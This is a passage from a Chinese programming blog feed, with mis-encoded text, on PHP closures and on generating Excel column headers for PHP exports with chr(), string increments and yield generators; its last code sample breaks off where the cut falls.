href="http://blog.shixinyu.space/2019/09/18/æµ…è°ˆPHPä¸­çš„staticå…³é”®å­—/">æµ…è°ˆPHPä¸­çš„staticå…³é”®å­—</a>ã€‚</p></blockquote><h3 id="2-å»¶æ—¶æ‰§è¡Œå‡½æ•°"><a href="#2-å»¶æ—¶æ‰§è¡Œå‡½æ•°" class="headerlink" title="2. å»¶æ—¶æ‰§è¡Œå‡½æ•°"></a>2. å»¶æ—¶æ‰§è¡Œå‡½æ•°</h3><p>æ¯”å¦‚ï¼Œæˆ‘ä»¬åœ¨ JavaScript ä¸­æ¯éš” 1 ç§’é’Ÿè¾“å‡ºä¸€ä¸ªéšæœºæ•°</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setInterval(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="built_in">console</span>.log(<span class="built_in">Math</span>.random())&#125;, <span class="number">1000</span>)</span><br></pre></td></tr></table></figure><p>åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œæˆ‘ä»¬å¯¹é—­åŒ…è¿›è¡Œäº†å¤šæ¬¡è°ƒç”¨ï¼Œè€Œä¸”ä¸æ˜¯è°ƒç”¨æ—¶å³æ—¶æ‰§è¡Œã€‚</p><h3 id="3-å¯¹å¤„ç†é€»è¾‘å°è£…ï¼Œå½¢æˆæ›´å¥½çš„ä¸€ä½“å°è£…"><a href="#3-å¯¹å¤„ç†é€»è¾‘å°è£…ï¼Œå½¢æˆæ›´å¥½çš„ä¸€ä½“å°è£…" class="headerlink" title="3. å¯¹å¤„ç†é€»è¾‘å°è£…ï¼Œå½¢æˆæ›´å¥½çš„ä¸€ä½“å°è£…"></a>3. å¯¹å¤„ç†é€»è¾‘å°è£…ï¼Œå½¢æˆæ›´å¥½çš„ä¸€ä½“å°è£…</h3><p><strong>é€šå¸¸æˆ‘ä»¬åœ¨è°ƒç”¨å‡½æ•°æ—¶ï¼Œä¼ å…¥çš„æ˜¯å‚æ•°æ˜¯æ•°æ®ï¼Œé‚£ä¹ˆåªèƒ½é€šè¿‡å‚æ•°å¯¹å‡½æ•°çš„ç»“æœè¿›è¡Œæ§åˆ¶ï¼Œæ— æ³•æ§åˆ¶å…¶è¿‡ç¨‹ï¼Œè€ŒåŒ¿åå‡½æ•°çš„å­˜åœ¨å¯ä»¥ä½œä¸ºå‚æ•°ä¼ ç»™å‡½æ•°ï¼Œä¹Ÿå¯ä»¥ä½œä¸ºå˜é‡èµ‹å€¼ï¼Œè¿›è€Œæ§åˆ¶å‡½æ•°çš„æ‰§è¡Œè¿‡ç¨‹ï¼Œå› æ­¤ï¼ŒåŒ¿åå‡½æ•°çš„å¼•å…¥å¢å¼ºäº†ç¨‹åºç¼–å†™çš„çµæ´»æ€§ï¼Œå¯ä»¥å®ç°æ›´åŠ é«˜æ•ˆçš„è®¾è®¡æ–¹æ¡ˆã€‚</strong></p><p>å¦‚æœåœ¨æœ‰é—­åŒ…å‰ï¼Œæˆ‘ä»¬éœ€è¦å•ç‹¬åˆ›å»ºå…·åå‡½æ•°ï¼Œç„¶åä½¿ç”¨åç§°å¼•ç”¨è¿™ä¸ªå‡½æ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$func = <span class="function"><span class="keyword">function</span><span class="params">($value)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $value * <span class="number">2</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">print_r(array_map($func, range(<span class="number">1</span>, <span class="number">5</span>)));</span><br></pre></td></tr></table></figure><p>ä½†è¿™æ ·æŠŠå›è°ƒä¸ä½¿ç”¨åˆ†ç¦»ï¼Œè€Œé—­åŒ…çš„å‡ºç°å°±å¾ˆå¥½çš„è§£å†³äº†è¿™ä¸ªé—®é¢˜ã€‚</p><p>è€Œç”±äºé—­åŒ…çš„å°è£…æ€§ï¼Œé—­åŒ…å†…æ— æ³•è®¿é—®åŒ…å¤–å˜é‡ï¼Œä½†æˆ‘ä»¬å¯ä»¥é€šè¿‡<code>use</code>å…³é”®å­—æ¥å¼•å…¥å¤–éƒ¨å˜é‡ï¼Œå¦‚ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$quantity = <span class="number">10</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="params">($price)</span> <span class="title">use</span> <span class="params">($quantity)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $price * $quantity;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å†æ¥ä¸€ä¸ªä¾‹å­ï¼Œä½¿ç”¨é—­åŒ…æ‰“å°æ–æ³¢é‚£å¥‘æ•°åˆ—ã€‚æˆ‘ä»¬çŸ¥é“æ–æ³¢é‚£å¥‘æ•°åˆ—æœ‰ä¸‹é¢çš„è§„å¾‹ï¼š</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># f(<span class="built_in">n</span>) è¡¨ç¤ºæ•°åˆ—ä¸­ç¬¬ <span class="built_in">n</span> ä¸ªæ•°çš„å€¼</span><br><span class="line">f(<span class="built_in">n</span>) = <span class="number">0</span>; (<span class="built_in">n</span> = <span class="number">0</span>)</span><br><span class="line">f(<span class="built_in">n</span>) = <span class="number">1</span>; (<span class="built_in">n</span> = <span class="number">1</span>)</span><br><span class="line">f(<span class="built_in">n</span>) = f(<span class="built_in">n</span>-<span class="number">1</span>)+f(<span class="built_in">n</span>-<span class="number">2</span>); (<span class="built_in">n</span> &gt;= <span class="number">2</span>)</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨é€’å½’çš„æ–¹æ³•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fibonacci</span><span class="params">(int $n)</span>: <span class="title">int</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ($n &lt; <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> $n;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> fibonacci($n<span class="number">-1</span>) + fibonacci($n<span class="number">-2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> fibonacci(<span class="number">10</span>), <span class="string">"\n"</span>; <span class="comment">// 55</span></span><br></pre></td></tr></table></figure><p>å¦‚æœæ‰“å°æ•°åˆ—ï¼Œé‚£æ¯ä¸€æ¬¡éƒ½éœ€è¦é‡å¤è®¡ç®—å‰é¢å·²ç»è®¡ç®—è¿‡çš„æ•°æ®ï¼ˆåªéœ€è¦å‰ä¸¤ä¸ªå°±å¥½ï¼‰ã€‚å¯ä»¥ä½¿ç”¨é—­åŒ…ä¿å­˜ä¸Šä¸€æ¬¡çš„è¿è¡Œç¯å¢ƒã€‚</p><p>php ç‰ˆæœ¬</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$fibonacci = <span class="function"><span class="keyword">function</span> <span class="params">()</span>: <span class="title">callable</span> </span>&#123;</span><br><span class="line">    $x = <span class="number">0</span>;</span><br><span class="line">    $y = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> <span class="params">()</span> <span class="title">use</span> <span class="params">(&amp;$x, &amp;$y)</span>: <span class="title">int</span> </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>($x, $y) = [$y, $x+$y];</span><br><span class="line">        <span class="keyword">return</span> $x;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">$f = $fibonacci();</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; <span class="number">10</span>; $i++) &#123;</span><br><span class="line">    <span class="keyword">echo</span> $f() , <span class="string">"\n"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>js ç‰ˆæœ¬</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> fibonacci = <span class="function"><span class="params">_</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> x = <span class="number">0</span>, y = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="params">_</span> =&gt;</span> &#123;</span><br><span class="line">        [x, y] = [y, x+y];</span><br><span class="line">        <span class="keyword">return</span> x;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> f = fibonacci();</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt;= <span class="number">10</span>; i++) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(f());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>åˆç†ä½¿ç”¨é—­åŒ…ï¼Œèƒ½å¤Ÿè®©æˆ‘ä»¬çš„ä»£ç æ›´åŠ æ¸…æ™°ã€æ›´åŠ çµæ´»ã€‚</p><hr><h2 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h2><ol><li><a href="https://xueyuanjun.com/post/4341.html/page/2#comments" target="_blank" rel="noopener">é—­åŒ…å’ŒåŒ¿åå‡½æ•° - å­¦é™¢å›</a></li><li><a href="https://www.bilibili.com/video/av67412371" target="_blank" rel="noopener">é—­åŒ…çš„ç¼–ç¨‹æ€æƒ³ - Bç«™</a></li><li><a href="https://zh.wikipedia.org/wiki/é—­åŒ…_(è®¡ç®—æœºç§‘å­¦)" target="_blank" rel="noopener">é—­åŒ…-ç»´åŸºç™¾ç§‘</a></li><li><a href="https://www.php.net/manual/zh/class.closure.php" target="_blank" rel="noopener">Closureç±» - PHPæ‰‹å†Œ</a></li><li><a href="https://www.php.net/manual/zh/language.types.callable.php" target="_blank" rel="noopener">Callable - PHPæ‰‹å†Œ</a></li><li><a href="https://learnku.com/articles/4625/php-closure-closure" target="_blank" rel="noopener">PHP é—­åŒ…ï¼ˆClosureï¼‰- LearKu</a></li><li><a href="https://learnku.com/articles/7469/learn-the-closure-function-closures" target="_blank" rel="noopener">å­¦ä¹ ä¸€ä¸‹é—­åŒ…å‡½æ•° - LearKu</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> è½¯ä»¶ç¼–ç¨‹ </category>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP å¯¼å‡º Excel é—®é¢˜</title>
      <link href="/post/excel-export/"/>
      <url>/post/excel-export/</url>
      
        <content type="html"><![CDATA[<p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g93qzm4y04j30im09bwf0.jpg" alt=""></p><a id="more"></a><p>æˆ‘ä»¬åœ¨å·¥ä½œä¸­ç»å¸¸ä¼šé‡åˆ° Excel å¯¼å‡ºçš„é—®é¢˜ï¼Œæ¯”å¦‚ï¼š</p><ol><li>è¡¨æ ¼å†…å®¹çš„å¡«å……</li><li>ä¸‹è½½æ•°æ®è¿‡å¤§æ‰§è¡Œè¶…æ—¶ã€å†…å­˜æº¢å‡º</li><li>å¼‚æ­¥å¯¼å‡º</li></ol><p>é‚£ä¹ˆï¼Œè¿™äº›é—®é¢˜åº”è¯¥æ€æ ·è§£å†³å‘¢ï¼Ÿ</p><h1 id="1-è¡¨æ ¼å†…å®¹çš„å¡«å……"><a href="#1-è¡¨æ ¼å†…å®¹çš„å¡«å……" class="headerlink" title="1. è¡¨æ ¼å†…å®¹çš„å¡«å……"></a>1. è¡¨æ ¼å†…å®¹çš„å¡«å……</h1><p>æˆ‘ä»¬çŸ¥é“ï¼Œåœ¨ PHP ä¸­ï¼Œ<a href="https://www.php.net/manual/en/function.ord.php" target="_blank" rel="noopener"><code>ord()</code></a>å¯å°†å­—ç¬¦è½¬æ¢ä¸º ASCII ç ï¼Œ<a href="https://www.php.net/manual/en/function.chr.php" target="_blank" rel="noopener"><code>chr()</code></a>åˆ™å¯ä»¥å°† ASCII ç è½¬æ¢ä¸ºå¯¹åº”å­—ç¬¦ï¼ŒäºŒè€…ä¸ºäº’è¡¥å‡½æ•°ã€‚</p><p>é€šè¿‡æŸ¥çœ‹ Excelï¼Œæˆ‘ä»¬çŸ¥é“ä¸€ä¸ª sheet ä¸­ï¼Œåˆ—åºå·æ˜¯ <code>A1, B1, C1 ...</code>é€’å¢çš„ï¼Œè€Œè¡Œåºå·æ˜¯<code>A2, A3, A4...</code>é€’å¢çš„ã€‚ä¸‹é¢ï¼Œå°±è®©æˆ‘ä»¬ç”¨ä»£ç æ¥ç”Ÿæˆä¸€ä¸‹Excel ä¸­çš„åˆ—ã€‚</p><h2 id="æ–¹æ¡ˆä¸€"><a href="#æ–¹æ¡ˆä¸€" class="headerlink" title="æ–¹æ¡ˆä¸€"></a>æ–¹æ¡ˆä¸€</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">$rawData = [</span><br><span class="line">    [</span><br><span class="line">        <span class="string">'name'</span> =&gt; <span class="string">'å¼ ä¸‰'</span>,</span><br><span class="line">        <span class="string">'gender'</span> =&gt; <span class="string">' ç”·'</span>,</span><br><span class="line">        <span class="string">'age'</span> =&gt; <span class="number">19</span>,</span><br><span class="line">        <span class="string">'birthday'</span> =&gt; <span class="string">'2000-01-01'</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">'name'</span> =&gt; <span class="string">'æå››'</span>,</span><br><span class="line">        <span class="string">'gender'</span> =&gt; <span class="string">'ç”·'</span>,</span><br><span class="line">        <span class="string">'age'</span> =&gt; <span class="number">29</span>,</span><br><span class="line">        <span class="string">'birthday'</span> =&gt; <span class="string">'1990-01-01'</span></span><br><span class="line">    ]</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="comment">//æ‹¼è£…å¯¼å‡ºæ•°æ®</span></span><br><span class="line">$sheetData = [</span><br><span class="line">    <span class="string">'å§“å'</span> =&gt; array_column($rawData, <span class="string">'name'</span>),</span><br><span class="line">    <span class="string">'æ€§åˆ«'</span> =&gt; array_column($rawData, <span class="string">'gender'</span>),</span><br><span class="line">    <span class="string">'å¹´é¾„'</span> =&gt; array_column($rawData, <span class="string">'age'</span>),</span><br><span class="line">    <span class="string">'ç”Ÿæ—¥'</span> =&gt; array_column($rawData, <span class="string">'birthday'</span>),</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">$excelObj = <span class="keyword">new</span> \PHPExcel();</span><br><span class="line">$sheet    = $excelObj-&gt;getActiveSheet();</span><br><span class="line"></span><br><span class="line"><span class="comment">//ç”Ÿæˆå¯¼å‡ºè¡¨æ ¼</span></span><br><span class="line">$i = <span class="number">65</span>;<span class="comment">//A åœ¨ ASCII ä¸­çš„åè¿›åˆ¶ä¸º 65</span></span><br><span class="line"><span class="keyword">foreach</span> ($sheetData <span class="keyword">as</span> $title =&gt; $datum) &#123;</span><br><span class="line">    <span class="comment">//å¡«å……è¡¨å¤´</span></span><br><span class="line">    $row = chr($i++);</span><br><span class="line">    $sheet-&gt;setCellValue($row . <span class="string">'1'</span>, $title);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//å¡«å……å†…å®¹</span></span><br><span class="line">    $j = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">foreach</span> ($datum <span class="keyword">as</span> $item) &#123;</span><br><span class="line">        $sheet-&gt;setCellValueExplicit($row . $j++, $item);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¼˜ç‚¹ï¼šå¯éšå¯¼å‡ºå†…å®¹è‡ªé€‚åº”ï¼Œæ‰©å±•æ€§å¼º</p><p>ç¼ºç‚¹ï¼šè¡¨å¤´åªèƒ½å…¼å®¹åˆ°<code>A1~Z1</code>ï¼Œè¶…è¿‡<code>Z1</code>åˆ™ä¼šè§¦å‘ bug è€Œæ— æ³•å¯¼å‡º</p><h1 id="æ–¹æ¡ˆäºŒ"><a href="#æ–¹æ¡ˆäºŒ" class="headerlink" title="æ–¹æ¡ˆäºŒ"></a>æ–¹æ¡ˆäºŒ</h1><p>é’ˆå¯¹æ–¹æ¡ˆä¸€çš„ç¼ºç‚¹ï¼Œæˆ‘ä»¬æ¥æ‰©å±•è¡¨å¤´çš„å®¹é‡ï¼Œåˆ©ç”¨PHPä¸­çš„å­—ç¬¦ä¸²é€’å¢æ¥ç”Ÿæˆè¡¨å¤´ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span>($i = <span class="string">'A'</span>; $i &lt;= <span class="string">'Z'</span>; $i++) &#123;</span><br><span class="line">    <span class="keyword">echo</span> $i . <span class="string">'1'</span>, PHP_EOL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¼˜ç‚¹ï¼šç®€å•å¿«é€Ÿç”Ÿæˆè¡¨å¤´</p><p>ç¼ºç‚¹ï¼šåªèƒ½å…¼å®¹åˆ°<code>YZ1</code></p><p>åœ¨ Microsoft Office 365 2019 ä¸­ï¼Œæœ€å¤§åˆ—ä¸º<code>XFD</code>ï¼Œæ‰€ä»¥ï¼Œå¦‚æœè¦æ»¡è¶³ Excel çš„å¯¼å‡ºï¼Œæˆ‘ä»¬å¯ä»¥è¿™æ ·å®Œå…¨å…¼å®¹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$alphabet = [];</span><br><span class="line"><span class="keyword">for</span>($i = <span class="string">'A'</span>; $i &lt; <span class="string">'ZZZ'</span>; $i++) &#123;</span><br><span class="line">    $alphabet[] = $i . <span class="string">'1'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¥½äº†ï¼Œç°åœ¨æˆ‘ä»¬å·²ç»èƒ½å¤Ÿå®Œå…¨æ»¡è¶³ Excel çš„åˆ—éœ€æ±‚äº†ï¼Œä½†è¿™é‡Œè¿˜æœ‰ä¸€ç‚¹å°ç‘•ç–µï¼šæˆ‘ä»¬ç”Ÿæˆçš„æ‰€æœ‰æ•°æ®éƒ½å­˜å‚¨åœ¨æ•°ç»„ä¸­ï¼Œè¿™æ˜¾ç„¶æ˜¯å¯¹å†…å­˜çš„æå¤§æµªè´¹ï¼Œåº”è¯¥æŒ‰éœ€å­˜å–ã€‚æˆ‘ä»¬å†æ¥å°è¯•å¦ä¸€ç§æ–°çš„æ–¹å¼ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getAlphabet</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="string">'A'</span>; $i &lt; <span class="string">'ZZZ'</span>; $i++) &#123;</span><br><span class="line">        <span class="keyword">yield</span> $i;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (getAlphabet() <span class="keyword">as</span> $letter) &#123;</span><br><span class="line">    <span class="keyword">echo</span> $letter . <span class="string">'1'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç°åœ¨ä¼˜é›…äº†è®¸å¤šã€‚ä½†è¿™ç§æ–¹å¼å’Œä¸Šä¸€ç§æœ‰ä»€ä¹ˆåŒºåˆ«å‘¢ï¼Ÿ<br>è¯·æ³¨æ„è¿™æ®µä»£ç ä¸­çš„<code>yield</code>å…³é”®å­—ï¼Œè¿™æ˜¯è¿­ä»£ç”Ÿæˆå™¨ã€‚æˆ‘ä»¬å¯ä»¥ç†è§£ä¸ºæ¯å½“ CPU æ‰§è¡Œåˆ°<code>yield</code>å…³é”®å­—æ—¶ï¼Œå°±ä¼šæš‚å­˜å½“å‰çš„ä¸Šä¸‹æ–‡ï¼Œå¹¶å°†æ§åˆ¶æƒäº¤å›<code>foreach</code>ï¼Œè€Œä¸åƒæ™®é€šå‡½æ•°ä¸€æ¬¡è°ƒç”¨ç»“æŸåé”€æ¯ä¸Šä¸‹æ–‡ï¼ˆæ‰€ä»¥æˆ‘ä»¬éœ€è¦å°†å‡½æ•°æ‰€äº§ç”Ÿçš„å˜é‡è¿›è¡Œè¿”å›ï¼‰ï¼Œè¿™è®©æˆ‘ä»¬å¾—ä»¥åœ¨æ¯æ¬¡éœ€è¦åˆ°è¿™æ®µå‡½æ•°æ—¶ï¼Œéƒ½å¯ä»¥ä»ä¸Šæ¬¡åœä¸‹çš„ä½ç½®ç»§ç»­ï¼Œè€Œæ— éœ€æš‚å­˜æ•´ä¸ªå‡½æ•°çš„å¤„ç†ç»“æœï¼Œä»è€ŒèŠ‚çœäº†å†…å­˜ç©ºé—´ã€‚é€šè¿‡<code>memory_get_usage()</code>å‡½æ•°å¯ä»¥çœ‹åˆ°ï¼Œä¸Šä¸€ç§å®ç°æ–¹å¼éœ€è¦<code>1.9MB</code>ï¼Œè€Œ<code>yield</code>åªéœ€è¦<code>287.6KB</code>ï¼ŒäºŒè€…çš„ç©ºé—´å¤æ‚åº¦åˆ†åˆ«ä¸º<code>O(n)</code>å’Œ<code>O(1)</code>ã€‚</p><h1 id="æ–¹æ¡ˆä¸‰"><a href="#æ–¹æ¡ˆä¸‰" class="headerlink" title="æ–¹æ¡ˆä¸‰"></a>æ–¹æ¡ˆä¸‰</h1><p>è™½ç„¶ä¸Šè¿°ä¸¤ç§æ–¹æ¡ˆå·²ç»èƒ½å¤Ÿæ»¡è¶³æ­£å¸¸çš„éœ€æ±‚ï¼Œè€Œä¸”å®ç°ä¹Ÿè¶³å¤Ÿç®€å•ã€‚ä½†æˆ‘ä»¬è¿˜æ˜¯è¦æ¢ç´¢ä¸€ä¸‹æ˜¯å¦èƒ½å¤Ÿè§£å†³ä¸Šè¿°ç¼ºé™·çš„æ–¹å¼ï¼Œè¿™æ ·ï¼Œè¿™ä¸ªé—®é¢˜å°±æ¼”å˜æˆäº†äºŒåå…­è¿›åˆ¶çš„å­—ç¬¦è®¡æ•°å™¨ã€‚</p><p>æ€è·¯ï¼šæˆ‘ä»¬å¸¸è§çš„æœ‰äºŒè¿›åˆ¶ã€å…«è¿›åˆ¶ã€åè¿›åˆ¶ã€åå…­è¿›åˆ¶ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±å¯ä»¥ç…§çŒ«ç”»è™ï¼Œå†™ä¸€ä¸ªäºŒåå…­è¿›åˆ¶ã€‚é€šè¿‡è§‚å¯Ÿï¼Œè¿™äº›è¿›åˆ¶å‡æ˜¯æœ«ä½é€’å¢ï¼Œå½“æœ«ä½ä¸ºæœ€å¤§å€¼æ—¶ï¼Œå‘ä¸Šä¸€ä½è¿›ä½ï¼Œå¹¶å°†ä½ä½å¤ä½ã€‚é‚£å°±è®©æˆ‘ä»¬æŠŠæƒ³æ³•è½¬æ¢ä¸ºä»£ç å§ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getAlphabet</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $letter = [];</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">65</span>, $count = <span class="number">0</span>; $i &lt; <span class="number">95</span>; $i++) &#123;</span><br><span class="line">        <span class="comment">// æœ«ä½é€’å¢å¤„ç†</span></span><br><span class="line">        <span class="keyword">if</span> ($i &gt; <span class="number">64</span> &amp;&amp; $i &lt; <span class="number">91</span>) &#123;</span><br><span class="line">            $lastPlace = chr($i);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//è¿›ä½å¤„ç†</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="number">90</span> === $i) &#123;</span><br><span class="line">            $letter[] = substr(end($letter), <span class="number">0</span>, <span class="number">-1</span>) . chr($i);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// æ‰€æœ‰ä½å‡ä¸ºZæ—¶ï¼Œä½æ•°+1</span></span><br><span class="line">            <span class="keyword">if</span> (substr_count(end($letter), <span class="string">'Z'</span>) === strlen(end($letter))) &#123;</span><br><span class="line">                $letter[] = implode(<span class="string">''</span>, [<span class="string">'A'</span>, str_repeat(<span class="string">'A'</span>, strlen(end($letter)))]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// åŒä½æ•°ä¸‹é€’å¢</span></span><br><span class="line">                $letter[] = chr(ord(substr(end($letter), <span class="number">0</span>, <span class="number">1</span>)) + <span class="number">1</span>) . <span class="string">'A'</span>;</span><br><span class="line">                <span class="comment">/*</span></span><br><span class="line"><span class="comment">                 * æ­¤ç§æƒ…å†µä¸‹å¦‚ä½•è¿›è¡Œé€’å¢æ£€æµ‹å¤„ç†ï¼Ÿå¦‚ AXZ é€’å¢ååº”ä¸º AYAï¼Œå¦‚ä½•ä¿è¯éšç€ä½æ•°çš„é€’å¢ä¸ä¼šæ¶ˆè€—æ›´å¤šçš„æ—¶é—´ï¼Ÿ</span></span><br><span class="line"><span class="comment">                 */</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// è¿›ä½å®Œæˆåå°†è®¡æ•°å™¨å½’ä½</span></span><br><span class="line">            $i = <span class="number">65</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// é€’å¢ä½ä½</span></span><br><span class="line">            $letter[] = substr_replace(end($letter), $lastPlace, <span class="number">-1</span>, <span class="number">1</span>);</span><br><span 